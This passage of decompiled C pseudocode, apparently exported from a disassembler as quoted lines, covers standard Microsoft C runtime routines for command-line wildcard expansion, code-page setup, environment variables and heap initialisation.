    "      return copy_and_add_argument_to_buffer<char>((const char *)Start, 0, 0, (int)v4);",
    "    v6 = v36;",
    "  }",
    "  if ( v6 == 47 || v6 == 92 || (v20 = v6 == 58, v8 = 0, v20) )",
    "    v8 = 1;",
    "  v25[0] = 0;",
    "  v9 = v3 - Start + 1;",
    "  v25[1] = 0;",
    "  v10 = 0;",
    "  Block = 0;",
    "  v27 = 0;",
    "  if ( v8 )",
    "    v10 = v9;",
    "  v28 = 0;",
    "  v24 = v10;",
    "  v29 = 0;",
    "  utf8_acp_compatibility_codepage = __acrt_get_utf8_acp_compatibility_codepage();",
    "  v12 = sub_1001CD4D((LPCCH)Start, (int)v25, utf8_acp_compatibility_codepage);",
    "  v13 = (const WCHAR *)Block;",
    "  if ( v12 )",
    "    v13 = 0;",
    "  FirstFile = FindFirstFileExW(v13, FindExInfoStandard, &v37, FindExSearchNameMatch, 0, 0);",
    "  if ( FirstFile == (HANDLE)-1 )",
    "  {",
    "    v15 = copy_and_add_argument_to_buffer<char>((const char *)Start, 0, 0, (int)v35);",
    "    if ( v29 )",
    "      _free_base(Block);",
    "    return v15;",
    "  }",
    "  v23 = (v35[1] - *v35) >> 2;",
    "  while ( 1 )",
    "  {",
    "    v30[0] = 0;",
    "    v30[1] = 0;",
    "    v31 = 0;",
    "    v32 = 0;",
    "    v33 = 0;",
    "    v34 = 0;",
    "    v16 = __acrt_get_utf8_acp_compatibility_codepage();",
    "    v17 = sub_10023E5F(v37.cFileName, (int)v30, (int)&v36, v16);",
    "    v18 = (const char *)v31;",
    "    if ( v17 )",
    "      v18 = 0;",
    "    if ( *v18 != 46 )",
    "      break;",
    "    v19 = v18[1];",
    "    if ( v19 )",
    "    {",
    "      if ( v19 != 46 || v18[2] )",
    "        break;",
    "    }",
    "    v20 = v34 == 0;",
    "LABEL_33:",
    "    if ( !v20 )",
    "      _free_base(v31);",
    "    if ( !FindNextFileW(FirstFile, &v37) )",
    "    {",
    "      v21 = (v35[1] - *v35) >> 2;",
    "      if ( v23 != v21 )",
    "        sub_10029770(*v35 + 4 * v23, v21 - v23, 4, unknown_libname_27);",
    "      FindClose(FirstFile);",
    "      if ( v29 )",
    "        _free_base(Block);",
    "      return 0;",
    "    }",
    "  }",
    "  v22 = copy_and_add_argument_to_buffer<char>(v18, (int)Start, v24, (int)v35);",
    "  if ( !v22 )",
    "  {",
    "    v20 = v34 == 0;",
    "    goto LABEL_33;",
    "  }",
    "  if ( v34 )",
    "    _free_base(v31);",
    "  FindClose(FirstFile);",
    "  if ( v29 )",
    "    _free_base(Block);",
    "  return v22;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "void __thiscall unknown_libname_28(void ***this)",
    "{",
    "}int __thiscall sub_10024404(int this, int a2)",
    "{",
    "  int result; // eax",
    "",
    "  unknown_libname_19(this);",
    "  result = sub_1001CE84((_DWORD *)(this + 8), a2);",
    "  if ( result )",
    "  {",
    "    *(_DWORD *)(this + 12) = 0;",
    "    *(_BYTE *)(this + 20) = 0;",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(this + 20) = 1;",
    "    result = 0;",
    "    *(_DWORD *)(this + 12) = a2;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "int __thiscall unknown_libname_29(LPVOID *this)",
    "{",
    "}int __cdecl __acrt_expand_narrow_argv_wildcards(unsigned __int8 **a1, int *a2)",
    "{",
    "  return common_expand_argv_wildcards<char>(a1, a2);",
    "}",
    "",
    "",
    "int __cdecl __acrt_GetModuleFileNameA(HMODULE hModule, int a2, int a3)",
    "{",
    "  DWORD LastError; // eax",
    "  unsigned int utf8_acp_compatibility_codepage; // eax",
    "  int v6[4]; // [esp+0h] [ebp-22Ch] BYREF",
    "  int v7; // [esp+10h] [ebp-21Ch]",
    "  char v8; // [esp+14h] [ebp-218h]",
    "  WCHAR WideCharStr[2]; // [esp+1Bh] [ebp-211h] BYREF",
    "",
    "  if ( GetModuleFileNameW(hModule, (WCHAR *)((char *)WideCharStr + 1), 0x105u) )",
    "  {",
    "    v7 = 0;",
    "    v6[0] = a2;",
    "    v6[1] = a3;",
    "    v6[2] = a2;",
    "    v6[3] = a3;",
    "    v8 = 0;",
    "    utf8_acp_compatibility_codepage = __acrt_get_utf8_acp_compatibility_codepage();",
    "    __acrt_convert_wcs_mbs_cp<wchar_t,char,_lambda_0fec1a7b3f42a53036604e18c2d5e07e_,__crt_win32_buffer_no_resizing>(",
    "      (WCHAR *)((char *)WideCharStr + 1),",
    "      (int)v6,",
    "      (int)WideCharStr,",
    "      utf8_acp_compatibility_codepage);",
    "    return v7;",
    "  }",
    "  else",
    "  {",
    "    LastError = GetLastError();",
    "    __acrt_errno_map_os_error(LastError);",
    "    return 0;",
    "  }",
    "}",
    "",
    "",
    "void __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_4fdada1b837b2abbf20876fac97688ad_,_lambda_b57350f2640456a0859d250846f69caf_ &,_lambda_eed5e4f92b5b7d55fa22c48c484aaa54_>(",
    "        int *a1,",
    "        int a2,",
    "        int *a3)",
    "{",
    "  __acrt_lock(*a1);",
    "  unknown_libname_30(a2);",
    "  __acrt_unlock(*a3);",
    "}",
    "",
    "",
    "// Microsoft VisualC universal runtime",
    "volatile signed __int32 *__thiscall unknown_libname_30(volatile signed __int32 ****this)",
    "{",
    "}const wchar_t *__cdecl CPtoLocaleName(int a1)",
    "{",
    "  switch ( a1 )",
    "  {",
    "    case 932:",
    "      return L\"ja-JP\";",
    "    case 936:",
    "      return L\"zh-CN\";",
    "    case 949:",
    "      return L\"ko-KR\";",
    "    case 950:",
    "      return L\"zh-TW\";",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "UINT __cdecl getSystemCP(UINT a1)",
    "{",
    "  UINT result; // eax",
    "  _DWORD v2[3]; // [esp+0h] [ebp-10h] BYREF",
    "  char v3; // [esp+Ch] [ebp-4h]",
    "",
    "  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v2, 0);",
    "  dword_10040848 = 0;",
    "  result = a1;",
    "  switch ( a1 )",
    "  {",
    "    case 0xFFFFFFFE:",
    "      dword_10040848 = 1;",
    "      result = GetOEMCP();",
    "      break;",
    "    case 0xFFFFFFFD:",
    "      dword_10040848 = 1;",
    "      result = GetACP();",
    "      break;",
    "    case 0xFFFFFFFC:",
    "      dword_10040848 = 1;",
    "      result = *(_DWORD *)(v2[1] + 8);",
    "      break;",
    "  }",
    "  if ( v3 )",
    "    *(_DWORD *)(v2[0] + 848) &= ~2u;",
    "  return result;",
    "}",
    "",
    "",
    "void __cdecl setSBCS(struct __crt_multibyte_data *a1)",
    "{",
    "  int v1; // esi",
    "  int v2; // ecx",
    "",
    "  v1 = 0;",
    "  memset((char *)a1 + 24, 0, 0x101u);",
    "  *((_DWORD *)a1 + 1) = 0;",
    "  *((_DWORD *)a1 + 2) = 0;",
    "  *((_DWORD *)a1 + 135) = 0;",
    "  *((_DWORD *)a1 + 3) = 0;",
    "  v2 = 0;",
    "  *((_DWORD *)a1 + 4) = 0;",
    "  *((_DWORD *)a1 + 5) = 0;",
    "  do",
    "  {",
    "    *((_BYTE *)a1 + v2 + 24) = byte_1003F558[v2];",
    "    ++v2;",
    "  }",
    "  while ( v2 < 257 );",
    "  do",
    "  {",
    "    *((_BYTE *)a1 + v1 + 281) = byte_1003F659[v1];",
    "    ++v1;",
    "  }",
    "  while ( v1 < 256 );",
    "}",
    "",
    "",
    "void __cdecl setSBUpLow(struct __crt_multibyte_data *a1)",
    "{",
    "  int v1; // esi",
    "  unsigned int i; // eax",
    "  unsigned int j; // eax",
    "  BYTE *LeadByte; // ecx",
    "  unsigned int v5; // edx",
    "  char *v6; // eax",
    "  int v7; // ecx",
    "  WORD v8; // dx",
    "  char v9; // dl",
    "  char *v10; // ecx",
    "  int v11; // eax",
    "  int v12; // edx",
    "  char v13; // al",
    "  char v14; // al",
    "  _cpinfo CPInfo; // [esp+14h] [ebp-718h] BYREF",
    "  WORD CharType[512]; // [esp+28h] [ebp-704h] BYREF",
    "  WCHAR v17[128]; // [esp+428h] [ebp-304h] BYREF",
    "  WCHAR DestStr[128]; // [esp+528h] [ebp-204h] BYREF",
    "  CHAR MultiByteStr[256]; // [esp+628h] [ebp-104h] BYREF",
    "",
    "  if ( *((_DWORD *)a1 + 1) == 65001 || !GetCPInfo(*((_DWORD *)a1 + 1), &CPInfo) )",
    "  {",
    "    v10 = (char *)a1 + 25;",
    "    v11 = -90 - (_DWORD)a1;",
    "    v12 = -25 - (_DWORD)a1;",
    "    while ( 1 )",
    "    {",
    "      if ( (unsigned int)&v10[v11] > 0x19 )",
    "      {",
    "        if ( (unsigned int)&v10[-122 - (_DWORD)a1] > 0x19 )",
    "        {",
    "          v14 = 0;",
    "          goto LABEL_27;",
    "        }",
    "        *v10 |= 0x20u;",
    "        v13 = (_BYTE)v10 - 32;",
    "      }",
    "      else",
    "      {",
    "        *v10 |= 0x10u;",
    "        v13 = (_BYTE)v10 + 32;",
    "      }",
    "      v14 = v12 + v13;",
    "LABEL_27:",
    "      v10[256] = v14;",
    "      ++v10;",
    "      v11 = -90 - (_DWORD)a1;",
    "      if ( (unsigned int)&v10[v12] >= 0x100 )",
    "        return;",
    "    }",
    "  }",
    "  v1 = 256;",
    "  for ( i = 0; i < 0x100; ++i )",
    "    MultiByteStr[i] = i;",
    "  LOBYTE(j) = CPInfo.LeadByte[0];",
    "  LeadByte = CPInfo.LeadByte;",
    "  MultiByteStr[0] = 32;",
    "  while ( (_BYTE)j )",
    "  {",
    "    v5 = LeadByte[1];",
    "    for ( j = (unsigned __int8)j; j <= v5 && j < 0x100; ++j )",
    "      MultiByteStr[j] = 32;",
    "    LeadByte += 2;",
    "    LOBYTE(j) = *LeadByte;",
    "  }",
    "  sub_10025A13(0, 1u, MultiByteStr, 256, CharType, *((_DWORD *)a1 + 1), 0);",
    "  sub_10029F61(0, *((wchar_t **)a1 + 135), 0x100u, MultiByteStr, 0x100u, DestStr, 256, *((_DWORD *)a1 + 1), 0);",
    "  sub_10029F61(0, *((wchar_t **)a1 + 135), 0x200u, MultiByteStr, 0x100u, v17, 256, *((_DWORD *)a1 + 1), 0);",
    "  v6 = (char *)a1 + 25;",
    "  v7 = 0;",
    "  do",
    "  {",
    "    v8 = CharType[v7];",
    "    if ( (v8 & 1) != 0 )",
    "    {",
    "      *v6 |= 0x10u;",
    "      v9 = *((_BYTE *)DestStr + v7);",
    "    }",
    "    else if ( (v8 & 2) != 0 )",
    "    {",
    "      *v6 |= 0x20u;",
    "      v9 = *((_BYTE *)v17 + v7);",
    "    }",
    "    else",
    "    {",
    "      v9 = 0;",
    "    }",
    "    ++v7;",
    "    v6[256] = v9;",
    "    ++v6;",
    "    --v1;",
    "  }",
    "  while ( v1 );",
    "}",
    "",
    "",
    "// bad sp value at call has been detected, the output may be wrong!",
    "int __usercall setmbcp_internal@<eax>(",
    "        void *a1@<ebp>,",
    "        UINT a2,",
    "        bool a3,",
    "        struct __acrt_ptd *const a4,",
    "        struct __crt_multibyte_data **const a5)",
    "{",
    "}struct __crt_multibyte_data *__cdecl update_thread_multibyte_data_internal(",
    "        struct __acrt_ptd *const a1,",
    "        struct __crt_multibyte_data **const a2)",
    "{",
    "  struct __crt_multibyte_data *v2; // esi",
    "",
    "  if ( (dword_1003FAB8 & *((_DWORD *)a1 + 212)) != 0 && *((_DWORD *)a1 + 19) )",
    "  {",
    "    v2 = (struct __crt_multibyte_data *)*((_DWORD *)a1 + 18);",
    "  }",
    "  else",
    "  {",
    "    __acrt_lock(5);",
    "    v2 = (struct __crt_multibyte_data *)*((_DWORD *)a1 + 18);",
    "    if ( v2 != *a2 )",
    "    {",
    "      if ( v2",
    "        && !_InterlockedExchangeAdd((volatile signed __int32 *)v2, 0xFFFFFFFF)",
    "        && v2 != (struct __crt_multibyte_data *)&unk_1003F540 )",
    "      {",
    "        _free_base(v2);",
    "      }",
    "      v2 = *a2;",
    "      *((_DWORD *)a1 + 18) = *a2;",
    "      _InterlockedIncrement((volatile signed __int32 *)v2);",
    "    }",
    "    __acrt_unlock(5);",
    "  }",
    "  if ( !v2 )",
    "    abort();",
    "  return v2;",
    "}",
    "",
    "",
    "char __usercall __acrt_initialize_multibyte@<al>(void *a1@<ebp>)",
    "{",
    "  struct __acrt_ptd *v1; // eax",
    "",
    "  if ( !byte_1004084C )",
    "  {",
    "    dword_10040844 = (struct __crt_multibyte_data *)&unk_1003F540;",
    "    dword_10040840 = &unk_1003F868;",
    "    Destination = &unk_1003F760;",
    "    v1 = sub_1001FFBA();",
    "    setmbcp_internal(a1, 0xFFFFFFFD, 1, v1, &dword_10040844);",
    "    byte_1004084C = 1;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "struct __crt_multibyte_data *sub_10024B37()",
    "{",
    "  struct __acrt_ptd *v0; // eax",
    "",
    "  v0 = (struct __acrt_ptd *)sub_1001FFAC();",
    "  return update_thread_multibyte_data_internal(v0, &dword_10040844);",
    "}",
    "",
    "",
    "int __cdecl _setmbcp_nolock(UINT a1, struct __crt_multibyte_data *a2)",
    "{",
    "  UINT SystemCP; // ebx",
    "  unsigned int v3; // edi",
    "  int v4; // ecx",
    "  unsigned int v5; // eax",
    "  bool v6; // zf",
    "  BYTE *i; // eax",
    "  BYTE v8; // cl",
    "  unsigned int v9; // edi",
    "  char *v10; // edx",
    "  int v11; // ecx",
    "  char *v12; // eax",
    "  int v13; // ecx",
    "  _BYTE *v15; // eax",
    "  unsigned __int8 *v16; // ecx",
    "  unsigned __int8 v17; // al",
    "  unsigned int v18; // edx",
    "  _BYTE *v19; // ebx",
    "  _WORD *v20; // ecx",
    "  __int16 *v21; // edx",
    "  int v22; // edi",
    "  __int16 v23; // ax",
    "  int v24; // [esp+Ch] [ebp-24h]",
    "  int v25; // [esp+10h] [ebp-20h]",
    "  int v26; // [esp+14h] [ebp-1Ch]",
    "  _BYTE *v27; // [esp+14h] [ebp-1Ch]",
    "  struct _cpinfo CPInfo; // [esp+18h] [ebp-18h] BYREF",
    "",
    "  SystemCP = getSystemCP(a1);",
    "  v25 = SystemCP;",
    "  if ( !SystemCP )",
    "  {",
    "LABEL_36:",
    "    setSBCS(a2);",
    "    return 0;",
    "  }",
    "  v3 = 0;",
    "  v4 = 0;",
    "  v5 = 0;",
    "  v26 = 0;",
    "  do",
    "  {",
    "    if ( dword_1003F970[v5] == SystemCP )",
    "    {",
    "      memset((char *)a2 + 24, 0, 0x101u);",
    "      v24 = 48 * v26;",
    "      v15 = (char *)&unk_1003F980 + 48 * v26;",
    "      v27 = v15;",
    "      do",
    "      {",
    "        v16 = v15;",
    "        if ( *v15 )",
    "        {",
    "          do",
    "          {",
    "            v17 = v16[1];",
    "            if ( !v17 )",
    "              break;",
    "            v18 = *v16;",
    "            if ( v18 <= v17 )",
    "            {",
    "              v19 = (char *)a2 + v18 + 25;",
    "              do",
    "              {",
    "                if ( v18 >= 0x100 )",
    "                  break;",
    "                *v19 |= byte_1003F968[v3];",
    "                ++v18;",
    "                ++v19;",
    "              }",
    "              while ( v18 <= v16[1] );",
    "            }",
    "            v16 += 2;",
    "          }",
    "          while ( *v16 );",
    "          v15 = v27;",
    "        }",
    "        ++v3;",
    "        v15 += 8;",
    "        v27 = v15;",
    "      }",
    "      while ( v3 < 4 );",
    "      *((_DWORD *)a2 + 1) = v25;",
    "      *((_DWORD *)a2 + 2) = 1;",
    "      *((_DWORD *)a2 + 135) = CPtoLocaleName(v25);",
    "      v20 = (_WORD *)((char *)a2 + 12);",
    "      v21 = (__int16 *)((char *)&unk_1003F974 + v24);",
    "      v22 = 6;",
    "      do",
    "      {",
    "        v23 = *v21++;",
    "        *v20++ = v23;",
    "        --v22;",
    "      }",
    "      while ( v22 );",
    "      goto LABEL_35;",
    "    }",
    "    ++v4;",
    "    v5 += 12;",
    "    v26 = v4;",
    "  }",
    "  while ( v5 < 60 );",
    "  if ( SystemCP == 65000 || !IsValidCodePage((unsigned __int16)SystemCP) )",
    "    return -1;",
    "  if ( SystemCP == 65001 )",
    "  {",
    "    *((_DWORD *)a2 + 1) = 65001;",
    "    *((_DWORD *)a2 + 135) = 0;",
    "    *((_DWORD *)a2 + 6) = 0;",
    "    *((_WORD *)a2 + 14) = 0;",
    "    goto LABEL_9;",
    "  }",
    "  if ( !GetCPInfo(SystemCP, &CPInfo) )",
    "  {",
    "    if ( dword_10040848 )",
    "      goto LABEL_36;",
    "    return -1;",
    "  }",
    "  memset((char *)a2 + 24, 0, 0x101u);",
    "  *((_DWORD *)a2 + 1) = SystemCP;",
    "  v6 = CPInfo.MaxCharSize == 2;",
    "  *((_DWORD *)a2 + 135) = 0;",
    "  if ( v6 )",
    "  {",
    "    for ( i = CPInfo.LeadByte; *i; i += 2 )",
    "    {",
    "      v8 = i[1];",
    "      if ( !v8 )",
    "        break;",
    "      v9 = *i;",
    "      if ( v9 <= v8 )",
    "      {",
    "        v10 = (char *)a2 + v9 + 25;",
    "        v11 = v8 - v9 + 1;",
    "        do",
    "        {",
    "          *v10++ |= 4u;",
    "          --v11;",
    "        }",
    "        while ( v11 );",
    "      }",
    "    }",
    "    v12 = (char *)a2 + 26;",
    "    v13 = 254;",
    "    do",
    "    {",
    "      *v12++ |= 8u;",
    "      --v13;",
    "    }",
    "    while ( v13 );",
    "    *((_DWORD *)a2 + 135) = CPtoLocaleName(*((_DWORD *)a2 + 1));",
    "    v3 = 1;",
    "  }",
    "LABEL_9:",
    "  *((_DWORD *)a2 + 2) = v3;",
    "  *((_DWORD *)a2 + 3) = 0;",
    "  *((_DWORD *)a2 + 4) = 0;",
    "  *((_DWORD *)a2 + 5) = 0;",
    "LABEL_35:",
    "  setSBUpLow(a2);",
    "  return 0;",
    "}",
    "",
    "",
    "BOOL __cdecl x_ismbbtype_l(struct __crt_locale_pointers *a1, unsigned __int8 a2, int a3, unsigned __int8 a4)",
    "{",
    "  BOOL result; // eax",
    "  _DWORD v5[3]; // [esp+0h] [ebp-10h] BYREF",
    "  char v6; // [esp+Ch] [ebp-4h]",
    "",
    "  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v5, a1);",
    "  result = (a4 & *(_BYTE *)(v5[2] + a2 + 25)) != 0",
    "        || a3 && (*(_WORD *)(*(_DWORD *)v5[1] + 2 * a2) & (unsigned __int16)a3) != 0;",
    "  if ( v6 )",
    "    *(_DWORD *)(v5[0] + 848) &= ~2u;",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl _ismbblead(unsigned int Ch)",
    "{",
    "  return x_ismbbtype_l(0, Ch, 0, 4u);",
    "}",
    "",
    "",
    "char __acrt_initialize_command_line()",
    "{",
    "  dword_10040860 = (int)GetCommandLineA();",
    "  dword_10040864 = (int)GetCommandLineW();",
    "  return 1;",
    "}",
    "",
    "",
    "const wchar_t *__cdecl find_end_of_double_null_terminated_sequence(const wchar_t *a1)",
    "{",
    "  const unsigned __int16 *i; // edx",
    "",
    "  for ( i = a1; *i; i += wcslen(i) + 1 )",
    "    ;",
    "  return i + 1;",
    "}",
    "",
    "",
    "const wchar_t *__dcrt_get_narrow_environment_from_os()",
    "{",
    "  const wchar_t *result; // eax",
    "  WCHAR *v1; // esi",
    "  CHAR *v2; // ebx",
    "  unsigned int v3; // eax",
    "  CHAR *v4; // eax",
    "  CHAR *v5; // edi",
    "  int cchWideChar; // [esp+4h] [ebp-8h]",
    "  int cbMultiByte; // [esp+8h] [ebp-4h]",
    "",
    "  result = GetEnvironmentStringsW();",
    "  v1 = (WCHAR *)result;",
    "  if ( result )",
    "  {",
    "    v2 = 0;",
    "    cchWideChar = find_end_of_double_null_terminated_sequence(result) - result;",
    "    v3 = sub_10023952(0, 0, v1, cchWideChar, 0, 0, 0, 0);",
    "    cbMultiByte = v3;",
    "    if ( v3 )",
    "    {",
    "      v4 = (CHAR *)sub_100202D0(v3);",
    "      v5 = v4;",
    "      if ( v4 )",
    "      {",
    "        if ( sub_10023952(0, 0, v1, cchWideChar, v4, cbMultiByte, 0, 0) )",
    "        {",
    "          _free_base(0);",
    "          v2 = v5;",
    "        }",
    "        else",
    "        {",
    "          _free_base(v5);",
    "        }",
    "        FreeEnvironmentStringsW(v1);",
    "        return (const wchar_t *)v2;",
    "      }",
    "      else",
    "      {",
    "        _free_base(0);",
    "        FreeEnvironmentStringsW(v1);",
    "        return 0;",
    "      }",
    "    }",
    "    else",
    "    {",
    "      FreeEnvironmentStringsW(v1);",
    "      return 0;",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl common_set_variable_in_environment_nolock<char>(char *Str, int a2)",
    "{",
    "  char *v3; // edi",
    "  char *v4; // eax",
    "  int v5; // ebx",
    "  int v6; // eax",
    "  size_t v7; // ecx",
    "  int v8; // eax",
    "  unsigned int v9; // eax",
    "  unsigned int v10; // kr00_4",
    "  char *v11; // eax",
    "  char *v12; // esi",
    "  const CHAR *v13; // ecx",
    "  char *v14; // [esp+8h] [ebp-10h]",
    "  rsize_t SizeInBytes; // [esp+Ch] [ebp-Ch]",
    "  void *SizeInBytesb; // [esp+Ch] [ebp-Ch]",
    "  rsize_t SizeInBytesa; // [esp+Ch] [ebp-Ch]",
    "  _DWORD *Block; // [esp+10h] [ebp-8h]",
    "  _DWORD *Blocka; // [esp+10h] [ebp-8h]",
    "  char v20; // [esp+17h] [ebp-1h]",
    "",
    "  if ( !Str )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    return -1;",
    "  }",
    "  v3 = Str;",
    "  v4 = strchr(Str, 61);",
    "  v14 = v4;",
    "  if ( !v4 || v4 == Str )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 22;",
    "    _free_base(Str);",
    "    return -1;",
    "  }",
    "  v20 = v4[1];",
    "  sub_100251B5();",
    "  v5 = 0;",
    "  if ( !dword_10040338 )",
    "  {",
    "    if ( a2 && dword_1004033C )",
    "    {",
    "      if ( !sub_1001F4B9() )",
    "      {",
    "        *(_DWORD *)sub_1001E025() = 22;",
    "        goto LABEL_10;",
    "      }",
    "      sub_100251B5();",
    "    }",
    "    else",
    "    {",
    "      if ( !v20 )",
    "        goto LABEL_11;",
    "      dword_10040338 = (int)sub_10023CF0(1u, 4u);",
    "      _free_base(0);",
    "      if ( !dword_10040338",
    "        || !dword_1004033C && (dword_1004033C = (int)sub_10023CF0(1u, 4u), _free_base(0), !dword_1004033C) )",
    "      {",
    "LABEL_10:",
    "        v5 = -1;",
    "LABEL_11:",
    "        _free_base(Str);",
    "        return v5;",
    "      }",
    "    }",
    "  }",
    "  Block = (_DWORD *)dword_10040338;",
    "  if ( !dword_10040338 )",
    "    goto LABEL_10;",
    "  v6 = find_in_environment_nolock<char>(Str, v14 - Str);",
    "  SizeInBytes = v6;",
    "  if ( v6 < 0 || !*Block )",
    "  {",
    "    if ( !v20 )",
    "      goto LABEL_11;",
    "    v9 = -v6;",
    "    SizeInBytesa = v9;",
    "    if ( v9 + 2 < v9 )",
    "      goto LABEL_10;",
    "    if ( v9 + 2 >= 0x3FFFFFFF )",
    "      goto LABEL_10;",
    "    Blocka = _recalloc_base(Block, v9 + 2, 4u);",
    "    _free_base(0);",
    "    v8 = (int)Blocka;",
    "    if ( !Blocka )",
    "      goto LABEL_10;",
    "    v3 = 0;",
    "    Blocka[SizeInBytesa] = Str;",
    "    Blocka[SizeInBytesa + 1] = 0;",
    "LABEL_32:",
    "    dword_10040338 = v8;",
    "    goto LABEL_33;",
    "  }",
    "  _free_base((void *)Block[v6]);",
    "  v7 = SizeInBytes;",
    "  if ( !v20 )",
    "  {",
    "    while ( Block[v7] )",
    "    {",
    "      Block[v7] = Block[v7 + 1];",
    "      ++v7;",
    "    }",
    "    SizeInBytesb = _recalloc_base(Block, v7, 4u);",
    "    _free_base(0);",
    "    v8 = (int)SizeInBytesb;",
    "    if ( !SizeInBytesb )",
    "      goto LABEL_33;",
    "    goto LABEL_32;",
    "  }",
    "  v3 = 0;",
    "  Block[SizeInBytes] = Str;",
    "LABEL_33:",
    "  if ( a2 )",
    "  {",
    "    v10 = strlen(Str);",
    "    v11 = (char *)sub_10023CF0(v10 + 2, 1u);",
    "    v12 = v11;",
    "    if ( !v11 )",
    "    {",
    "      _free_base(0);",
    "LABEL_41:",
    "      _free_base(v3);",
    "      return v5;",
    "    }",
    "    if ( strcpy_s(v11, v10 + 2, Str) )",
    "      _invoke_watson(0, 0, 0, 0, 0);",
    "    v13 = &v14[v12 - Str + 1];",
    "    v14[v12 - Str] = 0;",
    "    if ( !v20 )",
    "      v13 = 0;",
    "    if ( !__acrt_SetEnvironmentVariableA(v12, v13) )",
    "    {",
    "      *(_DWORD *)sub_1001E025() = 42;",
    "      _free_base(v12);",
    "      v5 = -1;",
    "      goto LABEL_41;",
    "    }",
    "    _free_base(v12);",
    "  }",
    "  _free_base(v3);",
    "  return 0;",
    "}",
    "",
    "",
    "_BYTE *__cdecl copy_environment<char>(const char **a1)",
    "{",
    "  const char **v1; // edi",
    "  int v3; // ecx",
    "  const char **i; // eax",
    "  _BYTE *v5; // eax",
    "  _BYTE *v6; // esi",
    "  const char *v7; // ecx",
    "  int v8; // ebx",
    "  unsigned int v9; // kr00_4",
    "",
    "  v1 = a1;",
    "  if ( !a1 )",
    "    return 0;",
    "  v3 = 0;",
    "  for ( i = a1; *i; ++v3 )",
    "    ++i;",
    "  v5 = sub_10023CF0(v3 + 1, 4u);",
    "  v6 = v5;",
    "  if ( !v5 )",
    "LABEL_12:",
    "    abort();",
    "  v7 = *a1;",
    "  if ( *a1 )",
    "  {",
    "    v8 = v5 - (_BYTE *)a1;",
    "    do",
    "    {",
    "      v9 = strlen(v7);",
    "      *(const char **)((char *)v1 + v8) = (const char *)sub_10023CF0(v9 + 1, 1u);",
    "      _free_base(0);",
    "      if ( !*(const char **)((char *)v1 + v8) )",
    "        goto LABEL_12;",
    "      if ( strcpy_s(*(char **)((char *)v1 + v8), v9 + 1, *v1) )",
    "        _invoke_watson(0, 0, 0, 0, 0);",
    "      v7 = *++v1;",
    "    }",
    "    while ( *v1 );",
    "  }",
    "  _free_base(0);",
    "  return v6;",
    "}",
    "",
    "",
    "_BYTE *sub_100251B5()",
    "{",
    "  _BYTE *result; // eax",
    "",
    "  result = (_BYTE *)dword_10040338;",
    "  if ( (void *)dword_10040338 == dword_10040344 )",
    "  {",
    "    result = copy_environment<char>((const char **)dword_10040338);",
    "    dword_10040338 = (int)result;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "int __cdecl find_in_environment_nolock<char>(char *String1, size_t MaxCount)",
    "{",
    "  int v2; // edi",
    "  _DWORD *v3; // esi",
    "  const char *v4; // eax",
    "  char v5; // al",
    "",
    "  v2 = dword_10040338;",
    "  v3 = (_DWORD *)dword_10040338;",
    "  v4 = *(const char **)dword_10040338;",
    "  if ( !*(_DWORD *)dword_10040338 )",
    "    return -(((int)v3 - v2) >> 2);",
    "  while ( 1 )",
    "  {",
    "    if ( !_strnicoll(String1, v4, MaxCount) )",
    "    {",
    "      v5 = *(_BYTE *)(MaxCount + *v3);",
    "      if ( v5 == 61 || !v5 )",
    "        break;",
    "    }",
    "    v4 = (const char *)*++v3;",
    "    if ( !*v3 )",
    "      return -(((int)v3 - v2) >> 2);",
    "  }",
    "  return ((int)v3 - v2) >> 2;",
    "}",
    "",
    "",
    "int __cdecl __dcrt_set_variable_in_narrow_environment_nolock(char *a1, int a2)",
    "{",
    "  return common_set_variable_in_environment_nolock<char>(a1, a2);",
    "}",
    "",
    "",
    "void *__cdecl _recalloc_base(void *Block, size_t Count, size_t Size)",
    "{",
    "  size_t v4; // edi",
    "  size_t v5; // esi",
    "  char *v6; // ebx",
    "",
    "  if ( Count && 0xFFFFFFE0 / Count < Size )",
    "  {",
    "    *(_DWORD *)sub_1001E025() = 12;",
    "    return 0;",
    "  }",
    "  else",
    "  {",
    "    if ( Block )",
    "      v4 = _msize(Block);",
    "    else",
    "      v4 = 0;",
    "    v5 = Size * Count;",
    "    v6 = (char *)_realloc_base(Block, Size * Count);",
    "    if ( v6 )",
    "    {",
    "      if ( v4 < v5 )",
    "        memset(&v6[v4], 0, v5 - v4);",
    "    }",
    "    return v6;",
    "  }",
    "}",
    "",
    "",
    "void *__cdecl _recalloc(void *Block, size_t Count, size_t Size)",
    "{",
    "  return _recalloc_base(Block, Count, Size);",
    "}",
    "",
    "",
    "HANDLE sub_100252C0()",
    "{",
    "  return hHeap;",
    "}",
    "",
    "",
    "bool __acrt_initialize_heap()",
    "{",
    "  hHeap = GetProcessHeap();",
    "  return hHeap != 0;",
    "}",
    "",
    "",
    "char sub_100252F0()",
    "{",
    "  hHeap = 0;",
    "  return 1;",
    "}",
    "",
    "",
    "HANDLE sub_10025300()",
    "{",
    "  return hHeap;",
    "}",
    "",
    "",
    "char __cdecl __acrt_execute_initializers(_DWORD *a1, _DWORD *a2)",
    "{",
    "  _DWORD *v2; // esi",
    "  void (__cdecl **v3)(_DWORD); // esi",
    "",
    "  if ( a1 == a2 )",
    "    return 1;",
    "  v2 = a1;",
    "  do",
    "  {",
    "    if ( *v2 && !((unsigned __int8 (__thiscall *)(_DWORD))*v2)(*v2) )",
    "      break;",
    "    v2 += 2;",
    "  }",
    "  while ( v2 != a2 );",
    "  if ( v2 == a2 )",
    "    return 1;",
    "  if ( v2 != a1 )",
    "  {",
    "    v3 = (void (__cdecl **)(_DWORD))(v2 - 1);",
    "    do",
    "    {",
    "      if ( *(v3 - 1) )",
    "      {",
    "        if ( *v3 )",
    "          (*v3)(0);",
    "      }",
    "      v3 -= 2;",
    "    }",
    "    while ( v3 + 1 != a1 );",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
